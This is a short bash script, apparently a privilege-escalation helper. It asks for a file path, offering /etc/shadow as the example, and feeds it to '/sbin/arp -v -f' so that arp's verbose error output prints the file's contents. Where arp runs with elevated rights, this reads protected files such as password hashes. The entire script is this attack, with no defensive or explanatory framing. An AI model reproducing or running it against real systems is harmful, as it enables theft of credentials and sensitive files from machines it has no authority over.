#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
/sbin/arp -v -f $filepath
